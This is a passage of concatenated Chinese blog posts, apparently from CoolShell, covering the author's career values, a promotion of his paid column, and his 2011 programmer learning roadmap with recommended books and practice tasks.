**职业**。在过去20多年的职业生涯中，我从基层工程师做到管理，很多做技术的人都会转管理，但我却还是扎根技术，就算是在今天，还是会抠很多技术细节，包括写代码。因为我心里觉得，不写代码的人一定是做不好技术管理的，因为做技术管理有人要做技术决定，从不上手技术的人是做不好技术决定的，另一方面，我觉得管理是支持性的工作，不是产出性的工作，大多数的管理者无非是因为组织大了，所以需要管人管事，所以，必然要花大量的时间和精力处理各种问题，甚至办公室政治，然而，如果有一天失业了，大环境变得不好了，一个管理者和一个程序员要出去找工作，程序员会比管理者更能自食其力。所以，我并不觉得管理者这个职业有意思，我还是觉得程序员这个有创造性的职业更有趣。**通常来说，管理者的技能力需要到公司和组织里才能展现，而有创造力的技能的人是可以自己独立的能力，所以，我觉得程序员的技能比管理者的技能能让我更稳定更自地活着**。所以，我更喜欢“[电影工作组](https://coolshell.cn/articles/4951.html)”那样的团队和组织形式。

 

**打工**。对于打工，也就是加入一家公司工作，无论是在一家小公司还是一家大公司工作，都会有好的和不好的，任何公司都有其不完美的地方，这个需要承认。首先第一的肯定是完成公司交给你的任务（但我也不会是傻傻地完成工作，对于一些有问题的任务我也会提出我的看法），然后我会尽我所能在工作找到可以提高效率的地方进行改善。在推动公司/部门/团队在一技术和工程方面进步并不是一件很容易的事，因为进步是需要成本的，有时候，这种成本并不一定是公司和团队愿意接受的，而另外，从客观规律上来说，一件事的进步一定是会有和现状有一些摩擦的。有的人害怕有摩擦而忍了，而我则不是，我觉得与别人的摩擦并不可怕，因为大家的目标都是基本一致的，只是做事的标准和方式不一样，这是可能沟通的，始终是会相互理解的。而如果你没有去推动一个事，我觉得对于公司对于我个人来说，都是一种对人生的浪费，敬业也好，激情也好，其就是体现在你是否愿意冒险去推动一件于公于私都有利的事，而不是成为一个“听话”、“随大流”、“懒政”的人，即耽误了公司也耽误了自己。所以，我更信仰的是《[做正确的事情，等着被开除](http://www.aqee.net/post/do-the-right-thing-wait-to-get-fired.html)》，这些东西，可参看《[我看绩效考核](https://coolshell.cn/articles/17972.html)》，以及我在[Gitchat上的一些问答](https://mp.weixin.qq.com/s?__biz=MzUyOTA1NTkzNw==&mid=2247484417&idx=1&sn=316f9f6d6ac7cdca97123815a67a665a&chksm=fa67adafcd1024b948caed0e5528c4817a7ef2b1b1a3ab8da34e0ff4231b28c2659ee9951112#rd)。

 

**创业**。前两天，有个小伙来跟我说，说他要离开BAT要去创业公司了，说在那些更自由一些，没有大公司的种种问题。我毫不犹豫地教育了他一下，我说，你选择这个创业公司的动机不对啊，你无非就是在逃避一些东西罢了，你把创业公司当做是一个避风港，这是不对的，创业公司的问题可能会更多，去创业公司的更好的心态是，这个创业公司在干的事业是不是你的事业？说白了，如果你是为了你的事业，为了解决个什么，为了改进个什么，那么，创业是适合你的，**也只有在做自己事业的时候，你才能不惧困难，才会勇敢地面对一切**。**那种想找一个安稳的避风港呆着的心态是不会让你平静地，你要知道世界本来就是不平静的，找了自己的归宿和目标才可能让你真正的平静**。所以，在我现的创业团队，我不要求大家加班，我也不鸡汤洗脑，对于想要加入的人，我会跟他讲我现在遇到的各种问题以及各种机遇，并一直在让他自己思考，我们在做的事是不是自己的事业诉求？还可不可以更好？**每个人都应该为自己的事业为自己的理想去活一次，追逐自己的事业和理想并不容易，需要有很大的付出，而也只有你心底里的那个理想值得这么大的付出**……

 

**客户**。基于上述的价值观，在我现在创业的时候，我在面对客户的时候，也是一样的，我并不会完全的迁就于客户，我的一些银行客户和互联网客户应该体会到我的做的方式了，我并不觉得迁就用户，用户要什么我就应该给什么，用户想听什么，我就说什么，虽然这样可以省着精力，更圆滑，但这都不是我喜欢的，**我更愿意鲜明地表达我的观点，并拉着用户跟我一起成长，因为我并不觉得完成客户的项目有成就感，我的成就感来自客户的成长**。所以，面对客户有些做得不对有问题有隐患的地方，或是有什么做错的事，我基本上都是直言不讳地说出来，因为我觉得把真实的相法说出来是对客户和对自己最基本的尊重，不管客户最终的选择是什么，我都要把利弊跟客户讲清楚。我并不是在这里装，因为，我也想做一些更高级更有技术含量的事，所以，对于一些还达到的客户，我如果不把他们拉上来，我也对不起自己。

 

在我“不惑之年”形成了这些价值观体系，也许未来还会变，也许还不成熟，总之，我不愿跟大多数人一样，因为大多数人都是随遇而安随大流的，因为这样风险最小，而我想走一条属于自己的路，做真正的自己，就像我24岁从银行里出来时想的那样，**我选择对了一个正确的专业（计算机科学），呆在了一个正确的年代（信息化革命），这样的“狗屎运”几百年不遇，如果我还患得患失，那我岂不辜负活在这样一个刺激的时代？！我所要做的就是在这个时代中做有价值的事就好了！这个时代真的是太好了！**

(全文完)

写极客时间8个月了，我的专栏现在有一定的积累了，今天想自己推荐一下。因为最新的系列《程序员练级攻略（2018）版》正在连载中，而且文章积累量到了我也有比较足的自信向大家推荐我的这个专栏了。推荐就从最新的这一系统的文章开始。

2011年，我在 [CoolShell](https://coolshell.cn/) 上发表了 《[程序员技术练级攻略](https://coolshell.cn/articles/4990.html)》一文，得到了很多人的好评（转载的不算，在我的网站上都有近1000W的访问量了）。并且陆续收到了一些人的反馈，说跟着这篇文章找到了不错的工作。几年过去，也收到了好些邮件和私信，希望我把这篇文章更新一下，因为他们觉得有点落伍了。是的，**老实说，抛开这几年技术的更新迭代不说，那篇文章写得也不算特别系统，同时标准也有点低，当时是给一个想要入门的朋友写的，所以，非常有必要从头更新一下《程序员练级攻略》这一主题**。

目前，我在我极客时间的专栏上更新《程序员练级攻略（2018版）》。升级版的《程序员练级攻略》会比Coolshell上的内容更多，也更专业。这篇文章有【入门篇】、【修养篇】、【专业基础篇】、【软件设计篇】、【高手成长篇】五大篇章，它们会帮助你从零开始，一步步地，系统地，从陌生到熟悉，到理解掌握，从编码到设计再到架构，从码农到程序员再到工程师再到架构师的一步一步进阶，完成从普通到精通到卓越的完美转身……

这篇文章是我写得最累也是最痛苦的文章，原因如下：

-  **学习路径的梳理**。这是一份计算编程相关知识地图，也是一份成长和学习路径。所以有太多的推敲了，知识的路径，体，地图……这让我费了很多工夫，感觉像在编写一本教材一样，即不能太高大上，也不能误人子弟。
- **新旧知识的取舍。**另外，因为我的成长经历中很多技术都成了过去时，所以对于新时代的程序员应该学习新的技术，然后，很多基础技术在今天依然管用，所以，在这点上，哪些要那些不要，也花了我很多的工夫。
- **文章书籍的推荐**。为了推荐最好的学习资料和资源，老实说，我几乎翻遍了整个互联网，进行了大量的阅读和比较。这个过程让我也受益非浅。一开始，这篇文章的大小居然在500K左右，太多的信息就是没有信息，所以在信息的筛选上我花费了很多的工夫，删掉了60%的内容。但是，依然很宠大。

**总之，你一定会被这篇文章的内容所吓到的，是的，我就是故意这样做的，因为，这本来就没有什么捷径，也不可能速成，很多知识都是硬骨头，你只能一口一口的啃，我故意这样做就是为了让你不要有“速成”的幻想，也可以轻而一举的吓退那些不想用功不想努力的人**。

但是，我们也要知道《易经》有云：“**取法其上，得乎其中，取法其中，得乎其下，取法其下，法不得也**”。所以，我这里会给你立个比较高标准，你要努力达到，相信我，就算是达不到，也会比你一开始期望的要高很多……

下面是这份练级攻略的目录，目前只在极客时间上发布，你需要付费阅读（在本文最后有相关的二维码）。



![img](photo/程序员练级攻略.png)

 

那么，除程序员练级攻略外，我还写了哪些内容？下面是迄今为止我所有的文章的目录。你可以在下面看一下相关的目录。这也算是我开收费专栏来8个月给大家的一份答卷吧。我也没有想到，我居然写了这么多的文章，而且对很多人都很有用。

首先是个人成长和经验之谈的东西，在这里的文章还没有完全更新完，未来要更新什么我也不清楚，但是可以呈现出来的内容和方向如下所示，供你参考。对于个人成长中的内容，都是我多年来的心得和体会，从读者的反馈来看是非常不错的，你一定要要阅读的。

![img](photo/个人成长和经验之谈-319x1024.png)

分布式系统架构，我一共出了两个系列，一个是分布式系统架构的本质，另一个是设计模式。前者偏概念，后者偏技术。这里旨在让你看到整个分布式系统设计的一个非常系统的蓝图，但是因为在手机端上，不可能写得非常细，所以，会缺失一些细节，这些细节我是故意缺失的，主要是有几方面的原因，

- 一方面，这是为了阅读的效果，手机上的文章不过长，所以，不能有太多的细节。
- 另一方面，也是是想留给大家自行学习，而不是一定要我把饭喂到你的嘴里，你才能吃得着。**学习不只是为要答案，而是学方法**
- 最后是我的私心，因为我也在创业，所以，技术细节上东西正是我在做的产品，所以，如果你想了解得更细，你需要和我有更商业合作。

![img](photo/分布式架构的本质.png)

 

![img](photo/分布式架构设计模式-弹力篇.png)

![img](photo/分布式架构设计模式-管理篇.png)

![img](photo/分布式架构设计模式-性能篇.png)

区块链的技术专栏本来不在我的写作计划中的，但是因为来问我这方面的技术人太多了，所以，就被问了一系列的文章，这里的文章除了一些技术上的科普，同样有有很多我的观点，你不但可以学到技术，还可以了解一些金融知识和相关的逻辑，我个人觉得这篇文章是让你有独立思考的文章。

![img](photo/区块链技术.png)

我的专栏还在继续，接下来还有一个系列的文章——《从技术到管理》，欢迎关注，也欢迎扫码订阅。

**最后友情提示一下：在手机上学习并不是最好的学习方式，也不要在我的专栏上进行学习，把我的专栏当成一个你的助手，当成一个向导，当成一个跳板，真正的学习还是要在线下，专心的，系统地、有讨论地、不断实践地学习，这点希望大家切记！**

# 程序员技术练级攻略

#####  [2011年07月18日 ](https://coolshell.cn/articles/4990.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [659 条评论](https://coolshell.cn/articles/4990.html#comments) 10,236,894 人阅读

![程序员技术练级入略](photo/programmer.png)**注：该文最新的版本在这里《[程序员技术练级攻略（2018版）](https://coolshell.cn/articles/18360.html)》（需要付费阅读）**

月光博客6月12日发表了《[写给新手程序员的一封信](https://www.williamlong.info/archives/2700.html)》，翻译自《[An open letter to those who want to start programming](http://blog.akash.im/an-open-letter-to-those-who-want-to-start)》，我的朋友（他在本站的id是[Mailper](https://coolshell.cn/?author=3)）告诉我，他希望在酷壳上看到一篇更具操作性的文章。因为他也是喜欢编程和技术的家伙，于是，我让他把他的一些学习Python和Web编程的一些点滴总结一下。于是他给我发来了一些他的心得和经历，我在把他的心得做了不多的增改，并根据我的经历增加了“进阶”一节。**这是一篇由新手和我这个老家伙根据我们的经历完成的文章**。

我的这个朋友把这篇文章取名叫Build Your Programming Technical Skills，我实在不知道用中文怎么翻译，但我在写的过程中，**我觉得这很像一个打网游做任务升级的一个过程，所以取名叫“技术练级攻略”，题目有点大，呵呵，这个标题纯粹是为了好玩**。**这里仅仅是在分享Mailper和我个人的学习经历。**（注：省去了我作为一个初学者曾经学习过的一些技术(今天明显过时了)，如：Delphi/Power builder，也省去了我学过的一些我觉得没意思的技术Lotus Notes/ActiveX/COM/ADO/ATL/.NET ……）

目录



[前言](https://coolshell.cn/articles/4990.html#前言)[启蒙入门](https://coolshell.cn/articles/4990.html#启蒙入门)[进阶加深](https://coolshell.cn/articles/4990.html#进阶加深)[高级深入](https://coolshell.cn/articles/4990.html#高级深入)

#### 前言

你是否觉得自己从学校毕业的时候只做过小玩具一样的程序？走入职场后哪怕没有什么经验也可以把以下这些课外练习走一遍（朋友的抱怨：学校课程总是从理论出发，作业项目都看不出有什么实际作用，不如从工作中的需求出发）

建议：

- 不要乱买书，不要乱追新技术新名词，基础的东西经过很长时间积累而且还会在未来至少10年通用。
- 回顾一下历史，看看历史上时间线上技术的发展，你才能明白明天会是什么样。
- 一定要动手，例子不管多么简单，建议至少自己手敲一遍看看是否理解了里头的细枝末节。
- 一定要学会思考，思考为什么要这样，而不是那样。还要举一反三地思考。

**注**：你也许会很奇怪为什么下面的东西很偏Unix/Linux，这是因为我觉得Windows下的编程可能会在未来很没有前途，原因如下：



- 现在的用户界面几乎被两个东西主宰了，1）Web，2）移动设备iOS或Android。Windows的图形界面不吃香了。
- 越来越多的企业在用成本低性能高的Linux和各种开源技术来构架其系统，Windows的成本太高了。
- 微软的东西变得太快了，很不持久，他们完全是在玩弄程序员。详情参见《[Windows编程革命史](https://coolshell.cn/articles/3008.html)》

所以，我个人认为以后的趋势是前端是Web+移动，后端是Linux+开源。开发这边基本上没Windows什么事。

#### 启蒙入门

**1、 学习一门脚本语言，例如Python/Ruby**

可以让你摆脱对底层语言的恐惧感，脚本语言可以让你很快开发出能用得上的小程序。实践项目:

- 处理文本文件，或者csv (关键词 python csv, python open, python sys) 读一个本地文件，逐行处理（例如 word count，或者处理log）
- 遍历本地文件系统 (sys, os, path)，例如写一个程序统计一个目录下所有文件大小并按各种条件排序并保存结果
- 跟数据库打交道 (python sqlite)，写一个小脚本统计数据库里条目数量
- 学会用各种print之类简单粗暴的方式进行调试
- 学会用Google (phrase, domain, use reader to follow tech blogs)

为什么要学脚本语言，因为他们实在是太方便了，很多时候我们需要写点小工具或是脚本来帮我们解决问题，你就会发现正规的编程语言太难用了。

**2、 用熟一种程序员的编辑器(不是IDE) 和一些基本工具**

- Vim / Emacs / Notepad++，学会如何配置代码补全，外观，外部命令等。
- Source Insight (或 ctag)

使用这些东西不是为了Cool，而是这些编辑器在查看、修改代码/配置文章/日志会更快更有效率。

**3、 熟悉Unix/Linux Shell和常见的命令行**

- 如果你用windows，至少学会用虚拟机里的linux， vmware player是免费的，装个Ubuntu吧
- 一定要少用少用图形界面。
- 学会使用man来查看帮助
- 文件系统结构和基本操作 ls/chmod/chown/rm/find/ln/cat/mount/mkdir/tar/gzip …
- 学会使用一些文本操作命令 sed/awk/grep/tail/less/more …
- 学会使用一些管理命令 ps/top/lsof/netstat/kill/tcpdump/iptables/dd…
- 了解/etc目录下的各种配置文章，学会查看/var/log下的系统日志，以及/proc下的系统运行信息
- 了解正则表达式，使用正则表达式来查找文件。

对于程序员来说Unix/Linux比Windows简单多了。（参看我四年前CSDN的博文《[其实Unix很简单](http://blog.csdn.net/haoel/article/details/1533720)》）学会使用Unix/Linux你会发现图形界面在某些时候实在是太难用了，相当地相当地降低工作效率。

**4、 学习Web基础（HTML/CSS/JS) + 服务器端技术 (LAMP)**

未来必然是Web的世界，学习WEB基础的最佳网站是[W3School](http://www.w3school.com.cn/)。

- 学习HTML基本语法
- 学习CSS如何选中HTML元素并应用一些基本样式（关键词：box model）
- 学会用  Firefox + Firebug 或 chrome 查看你觉得很炫的网页结构，并动态修改。
- 学习使用Javascript操纵HTML元件。理解DOM和动态网页（http://oreilly.com/catalog/9780596527402) 网上有免费的章节，足够用了。或参看 [DOM](http://www.w3school.com.cn/htmldom/index.asp) 。
- 学会用  Firefox + Firebug 或 chrome 调试Javascript代码（设置断点，查看变量，性能，控制台等）
- 在一台机器上配置[Apache ](https://coolshell.cn/articles/www.apache.org)或 [Nginx](https://coolshell.cn/articles/nginx.net)
- 学习[PHP](https://coolshell.cn/articles/www.php.net)，让后台PHP和前台HTML进行数据交互，对服务器相应浏览器请求形成初步认识。实现一个表单提交和反显的功能。
- 把PHP连接本地或者远程数据库 MySQL（MySQL 和 SQL现学现用够了）
- 跟完一个名校的网络编程课程（例如：http://www.stanford.edu/~ouster/cgi-bin/cs142-fall10/index.php ) 不要觉得需要多于一学期时间，大学生是全职一学期选3-5门课，你业余时间一定可以跟上
- 学习一个javascript库（例如jQuery 或 ExtJS）+  Ajax (异步读入一个服务器端图片或者数据库内容）+JSON数据格式。
- HTTP: The Definitive Guide 读完前4章你就明白你每天上网用浏览器的时候发生的事情了(proxy, gateway, browsers)
- 做个小网站（例如：一个小的留言板，支持用户登录，Cookie/Session，增、删、改、查，上传图片附件，分页显示）
- 买个域名，租个空间，做个自己的网站。

#### 进阶加深

**1、 C语言和操作系统调用**

- 重新学C语言，理解指针和内存模型，用C语言实现一下各种经典的算法和数据结构。推荐《[计算机程序设计艺术](http://product.china-pub.com/197050)》、《[算法导论](http://product.china-pub.com/31701)》和《[编程珠玑](http://product.china-pub.com/209243)》。

- 学习[（麻省理工免费课程）计算机科学和编程导论](https://coolshell.cn/articles/3723.html)

- 学习[（麻省理工免费课程）C语言内存管理](https://coolshell.cn/articles/2474.html)

- 学习Unix/Linux系统调用（

  Unix高级环境编程

  ），，了解系统层面的东西。

  - 用这些系统知识操作一下文件系统，用户（实现一个可以拷贝目录树的小程序）
  - 用fork/wait/waitpid写一个多进程的程序，用pthread写一个多线程带同步或互斥的程序。多进程多进程购票的程序。
  - 用signal/kill/raise/alarm/pause/sigprocmask实现一个多进程间的信号量通信的程序。
  - 学会使用gcc和gdb来编程和调试程序（参看我的《[用gdb调试程序](https://coolshell.cn/articles/blog.csdn.net/haoel/article/details/2879)》）
  - 学会使用makefile来编译程序。（参看我的《[跟我一起写makefile](https://coolshell.cn/articles/blog.csdn.net/haoel/article/details/2886)》）
  - IPC和Socket的东西可以放到高级中来实践。

- 学习Windows SDK编程（

  Windows 程序设计 

  ，

  MFC程序设计

  ）

  - 写一个窗口，了解WinMain/WinProcedure，以及Windows的消息机制。
  - 写一些程序来操作Windows SDK中的资源文件或是各种图形控件，以及作图的编程。
  - 学习如何使用MSDN查看相关的SDK函数，各种WM_消息以及一些例程。
  - 这本书中有很多例程，在实践中请不要照抄，试着自己写一个自己的例程。
  - 不用太多于精通这些东西，因为GUI正在被Web取代，主要是了解一下Windows 图形界面的编程。@[virushuo](https://twitter.com/#!/virushuo) 说：“ 我觉得GUI确实不那么热门了，但充分理解GUI工作原理是很重要的。包括移动设备开发，如果没有基础知识仍然很吃力。或者说移动设备开发必须理解GUI工作，或者在win那边学，或者在mac/iOS上学”。

**2、学习Java**

- Java 的学习主要是看经典的Core Java 《[Java 核心技术编程](http://product.china-pub.com/208978)》和《[Java编程思想](http://product.china-pub.com/34838)》（有两卷，我仅链了第一卷，足够了，因为Java的图形界面了解就可以了）
- 学习JDK，学会查阅Java API Doc http://download.oracle.com/javase/6/docs/api/
- 了解一下Java这种虚拟机语言和C和Python语言在编译和执行上的差别。从C、Java、Python思考一下“跨平台”这种技术。
- 学会使用IDE Eclipse，使用Eclipse 编译，调试和开发Java程序。
- 建一个Tomcat的网站，尝试一下JSP/Servlet/JDBC/MySQL的Web开发。把前面所说的那个PHP的小项目试着用JSP和Servlet实现一下。

**3、Web的安全与架构**

- 学习HTML5，网上有很多很多教程，以前[酷壳](https://coolshell.cn/)也介绍过很多，我在这里就不罗列了。
- 学习Web开发的安全问题（参考[新浪微博被攻击的这个事](https://coolshell.cn/articles/4914.html)，以及[Ruby的这篇文章](http://guides.rubyonrails.org/security.html)）
- 学习HTTP Server的rewrite机制，Nginx的反向代理机制，[fast-cgi](https://en.wikipedia.org/wiki/Fast_CGI)（如：[PHP-FPM](http://php-fpm.org/)）
- 学习Web的静态页面缓存技术。
- 学习Web的异步工作流处理，数据Cache，数据分区，负载均衡，水平扩展的构架。
- 实践任务：
  - 使用HTML5的canvas 制作一些Web动画。
  - 尝试在前面开发过的那个Web应用中进行SQL注入，JS注入，以及XSS攻击。
  - 把前面开发过的那个Web应用改成构造在Nginx + PHP-FPM + 静态页面缓存的网站

**4、学习关系型数据库**

- 你可以安装MSSQLServer或MySQL来学习数据库。
- 学习教科书里数据库设计的那几个范式，1NF，2NF，3NF，……
- 学习数据库的存过，触发器，视图，建索引，游标等。
- 学习SQL语句，明白表连接的各种概念（参看《[SQL  Join的图示](https://coolshell.cn/articles/3463.html)》）
- 学习如何优化数据库查询（参看《[MySQL的优化](https://coolshell.cn/articles/1846.html)》）
- **实践任务**：设计一个论坛的数据库，至少满足3NF，使用SQL语句查询本周，本月的最新文章，评论最多的文章，最活跃用户。

**5、一些开发工具**

- 学会使用SVN或Git来管理程序版本。
- 学会使用JUnit来对Java进行单元测试。
- 学习C语言和Java语言的coding standard 或 coding guideline。（我N年前写过一篇关C语言非常简单的文章——《[编程修养](http://blog.csdn.net/haoel/article/category/9200/2)》，这样的东西你可以上网查一下，一大堆）。
- 推荐阅读《[代码大全](http://product.china-pub.com/28351)》《[重构](http://product.china-pub.com/196374)》《[代码整洁之道](http://product.china-pub.com/196266)》

#### 高级深入

**1、C++ / Java 和面向对象**

我个人以为学好C++，Java也就是举手之劳。但是C++的学习曲线相当的陡。不过，我觉得C++是最需要学好的语言了。参看两篇趣文“[C++学习信心图](https://coolshell.cn/articles/2287.html)” 和“[21天学好C++](https://coolshell.cn/articles/2250.html)”

- 学习[（麻省理工免费课程）C++面向对象编程](https://coolshell.cn/articles/2474.html)

- 读我的 “[如何学好C++](https://coolshell.cn/articles/4119.html)”中所推荐的那些书至少两遍以上（如果你对C++的理解能够深入到像我所写的《[C++虚函数表解析](https://coolshell.cn/articles/12165.html)》或是《[C++对象内存存局](https://coolshell.cn/articles/12176.html)》，或是《[C/C++返回内部静态成员的陷阱](https://coolshell.cn/articles/12192.html)》那就非常不错了）

- 然后反思为什么C++要干成这样，Java则不是？你一定要学会对比C++和Java的不同。比如，Java中的初始化，垃圾回收，接口，异常，虚函数，等等。

- 实践任务：

  - 用C++实现一个BigInt，支持128位的整形的加减乘除的操作。
  - 用C++封装一个数据结构的容量，比如hash table。
  - 用C++封装并实现一个智能指针（一定要使用模板）。

- 《[设计模式](http://product.china-pub.com/25961)》必需一读，两遍以上，思考一下，这23个模式的应用场景。主要是两点：1）钟爱组合而不是继承，2）钟爱接口而不是实现。（也推荐《[深入浅出设计模式](http://product.china-pub.com/27862)》）

- 实践任务：

  - 使用工厂模式实现一个内存池。
  - 使用策略模式制做一个类其可以把文本文件进行左对齐，右对齐和中对齐。
  - 使用命令模式实现一个命令行计算器，并支持undo和redo。
  - 使用修饰模式实现一个酒店的房间价格订价策略——旺季，服务，VIP、旅行团、等影响价格的因素。

- 学习STL的用法和其设计概念  – 容器，算法，迭代器，函数子。如果可能，请读一下其源码。

- 实践任务：

  尝试使用面向对象、STL，设计模式、和WindowsSDK图形编程的各种技能

  - 做一个贪吃蛇或是俄罗斯方块的游戏。支持不同的级别和难度。
  - 做一个文件浏览器，可以浏览目录下的文件，并可以对不同的文件有不同的操作，文本文件可以打开编辑，执行文件则执行之，mp3或avi文件可以播放，图片文件可以展示图片。

- 学习C++的一些类库的设计，如： MFC（看看候捷老师的《[深入浅出MFC](http://product.china-pub.com/3565)》） ，Boost, ACE,  CPPUnit，STL （STL可能会太难了，但是如果你能了解其中的设计模式和设计那就太好了，如果你能深入到我写的《[STL string类的写时拷贝技术](http://blog.csdn.net/haoel/article/details/24058)》那就非常不错了，ACE需要很强在的系统知识，参见后面的“加强对系统的了解”）

- Java是真正的面向对象的语言，Java的设计模式多得不能再多，也是用来学习面向对象的设计模式的最佳语言了（参看[Java中的设计模式](https://coolshell.cn/articles/3320.html)）。

- 推荐阅读《[Effective Java](http://product.china-pub.com/195040)》 and 《[Java解惑](http://product.china-pub.com/197212)》

- 学习Java的框架，Java的框架也是多，如Spring, Hibernate，Struts 等等，主要是学习Java的设计，如IoC等。

- Java的技术也是烂多，重点学习J2EE架构以及JMS， RMI, 等消息传递和远程调用的技术。

- 学习使用Java做Web Service （[官方教程在这里](http://download.oracle.com/docs/cd/E17802_01/webservices/webservices/docs/2.0/tutorial/doc/)）

- **实践任务：** 尝试在Spring或Hibernate框架下构建一个有网络的Web Service的远程调用程序，并可以在两个Service中通过JMS传递消息。

C++和Java都不是能在短时间内能学好的，C++玩是的深，Java玩的是广，我建议两者选一个。我个人的学习经历是：

- 深究C++（我深究C/C++了十来年了）
- 学习Java的各种设计模式。

**2、加强系统了解**

重要阅读下面的几本书：

- 《[Unix编程艺术](http://product.china-pub.com/197413)》了解Unix系统领域中的设计和开发哲学、思想文化体系、原则与经验。你一定会有一种醍醐灌顶的感觉。

- 《[Unix网络编程卷1，套接字](http://product.china-pub.com/196770)》这是一本看完你就明白网络编程的书。重要注意TCP、UDP，以及多路复用的系统调用select/poll/epoll的差别。

- 《[TCP/IP详解 卷1:协议](http://product.china-pub.com/35)》- 这是一本看完后你就可以当网络黑客的书。了解以太网的的运作原理，了解TCP/IP的协议，运作原理以及如何TCP的调优。

- 实践任务：

  - 理解什么是阻塞（同步IO），非阻塞（异步IO），多路复用（select, poll, epoll）的IO技术。
  - 写一个网络聊天程序，有聊天服务器和多个聊天客户端（服务端用UDP对部分或所有的的聊天客户端进Multicast或Broadcast）。
  - 写一个简易的HTTP服务器。

- 《[Unix网络编程卷2，进程间通信](http://product.china-pub.com/196859)》信号量，管道，共享内存，消息等各种IPC…… 这些技术好像有点老掉牙了，不过还是值得了解。

- 实践任务：

  - 主要实践各种IPC进程序通信的方法。
  - 尝试写一个管道程序，父子进程通过管道交换数据。
  - 尝试写一个共享内存的程序，两个进程通过共享内存交换一个C的结构体数组。

- 学习《[Windows核心编程](http://product.china-pub.com/209058)》一书。把CreateProcess，Windows线程、线程调度、线程同步（Event,  信号量，互斥量）、异步I/O，内存管理，DLL，这几大块搞精通。

- **实践任务：**使用CreateProcess启动一个记事本或IE，并监控该程序的运行。把前面写过的那个简易的HTTP服务用线程池实现一下。写一个DLL的钩子程序监控指定窗口的关闭事件，或是记录某个窗口的按键。

- 有了多线程、多进程通信，TCP/IP，套接字，C++和设计模式的基本，你可以研究一下ACE了。使用ACE重写上述的聊天程序和HTTP服务器（带线程池）

- 实践任务：

  通过以上的所有知识，尝试

  - 写一个服务端给客户端传大文件，要求把100M的带宽用到80%以上。（注意，磁盘I/O和网络I/O可能会很有问题，想一想怎么解决，另外，请注意网络传输最大单元MTU）
  - 了解BT下载的工作原理，用多进程的方式模拟BT下载的原理。

**3、系统架构**

- 负载均衡。HASH式的，纯动态式的。（可以到Google学术里搜一些[关于负载均衡的文章](https://scholar.google.com.hk/scholar?q=负载均衡&hl=zh-CN&as_sdt=0&as_vis=1&oi=scholart)读读）
- 多层分布式系统 – 客户端服务结点层、计算结点层、数据cache层，数据层。J2EE是经典的多层结构。
- [CDN系统](https://en.wikipedia.org/wiki/Content_delivery_network) – 就近访问，内容边缘化。
- [P2P式系统](https://en.wikipedia.org/wiki/Peer-to-peer)，研究一下BT和电驴的算法。比如：[DHT算法](https://en.wikipedia.org/wiki/Distributed_hash_table)。
- 服务器备份，双机备份系统（Live-Standby和Live-Live系统），两台机器如何通过心跳监测对方？集群主结点备份。
- [虚拟化技术](https://en.wikipedia.org/wiki/Virtualization)，使用这个技术，可以把操作系统当应用程序一下切换或重新配置和部署。
- 学习[Thrift](http://thrift.apache.org/)，二进制的高性能的通讯中间件，支持数据(对象)序列化和多种类型的RPC服务。
- 学习[Hadoop](http://hadoop.apache.org/)。Hadoop框架中最核心的设计就是：MapReduce和HDFS。MapReduce的思想是由Google的一篇论文所提及而被广为流传的，简单的一句话解释MapReduce就是“任务的分解与结果的汇总”。HDFS是Hadoop分布式文件系统（Hadoop Distributed File System）的缩写，为分布式计算存储提供了底层支持。
- 了解[NoSQL数据库](https://en.wikipedia.org/wiki/NoSQL)（有人说可能是一个[过渡炒作的技术](https://coolshell.cn/articles/3609.html)），不过因为超大规模以及高并发的纯动态型网站日渐成为主流，而SNS类网站在数据存取过程中有着实时性等刚性需求，这使得目前NoSQL数据库慢慢成了人们所关注的焦点，并大有成为取代关系型数据库而成为未来主流数据存储模式的趋势。当前NoSQL数据库很多，大部分都是开源的，其中比较知名的有：MemcacheDB、Redis、Tokyo Cabinet(升级版为Kyoto Cabinet)、Flare、MongoDB、CouchDB、Cassandra、Voldemort等。

写了那么多，回顾一下，觉得自己相当的有成就感。希望大家不要吓着，我自己这十来年也在不断地学习，今天我也在学习中，人生本来就是一个不断学习和练级的过程。**不过，一定有漏的，也有不对的，还希望大家补充和更正**。（**我会根据大家的反馈随时更新此文**）欢迎大家通过我的微博（[@左耳朵耗子](http://weibo.com/haoel)）和twitter（@[haoel](https://twitter.com/haoel)）和我交流。

***—– 更新  2011/07/19 —–***

1）有朋友奇怪为什么我在这篇文章开头说了web+移动，却没有在后面提到iOS/Android的前端开发。因为我心里有一种感觉，移动设备上的UI最终也会被Javascript取代。大家可以用iPhone或Android看看google+，你就会明白了。

2）有朋友说我这里的东西太多了，不能为了学习而学习，我非常同意。我在文章的前面也说了要思考。另外，千万不要以为我说的这些东西是一些新的技术，这份攻略里95%以上的全是基础。而且都是久经考验的基础技术。即是可以让你一通百通的技术，也是可以让你找到一份不错工作的技术。

3）有朋友说学这些东西学完都40了，还不如想想怎么去挣钱。我想告诉大家，一是我今年还没有40岁，二是学无止境啊，三是我不觉得挣钱有多难，难的是怎么让你值那么多钱？无论是打工还是创业，是什么东西让你自己的价值，让你公司的价值更值钱？别的地方我不敢说，对于互联网或IT公司来说，技术实力绝对是其中之一。

4）有朋友说技术都是工具，不应该如此痴迷这句话没有错，有时候我们需要更多的是抬起头来看看技术以外的事情，或者是说我们在作技术的时候不去思考为什么会有这个技术，为什么不是别的，问题不在于技术，问题在于我们死读书，读死书，成了技术的书呆子。

5） 对于NoSQL，最近比较火，但我对其有点保守，所以，我只是说了解就可以。对于Hadoop，我觉得其在分布式系统上有巨大的潜力，所以需要学习。 对于关系型数据库，的确是很重要的东西，这点是我的疏忽，在原文里补充。

（全文完）

# 关于我”极客时间“的专栏

#####  [2018年01月02日 ](https://coolshell.cn/articles/18246.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [74 条评论](https://coolshell.cn/articles/18246.html#comments) 103,734 人阅读

![img](photo/geekbang-300x300.jpg)不少朋友都知道我在“[极客时间](https://time.geekbang.org/)”上开了一个收费专栏，这个专栏会开设大约一年的时间，一共会发布104篇文章。现在，我在上面以每周两篇文章的频率已发布了27篇文章了，也就是差不多两个半月的时间。新的一年开始了，写专栏这个事对我来说是第一次，在这个过程中有一些感想，所以，我想在这里说一下这些感受和一些相关的故事，算是一个记录，也算是对我专栏的正式介绍，还希望能得到、大家的喜欢和指点。（当然，CoolShell这边还是会持续更新的）

#### 为什么要开设一个收费专栏

首先，说一下，为什么要开这个收费专栏。

